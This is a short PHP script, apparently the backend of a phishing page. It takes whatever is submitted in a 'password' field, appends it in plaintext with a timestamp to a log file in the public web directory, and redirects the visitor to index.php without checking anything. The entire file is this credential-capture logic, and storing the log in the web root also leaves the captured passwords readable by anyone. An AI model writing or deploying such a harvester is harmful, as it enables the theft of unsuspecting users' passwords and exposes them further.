<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $saisie = trim($_POST["password"]);

    if (!empty($saisie)) {
        $fichier = "/var/www/html/log.txt";
        $date = date("Y-m-d H:i:s");
        $texte = "$date - $saisie\n";

        file_put_contents($fichier, $texte, FILE_APPEND | LOCK_EX);
    }
}

header("Location: index.php"); // Redirection après soumission
exit;
?>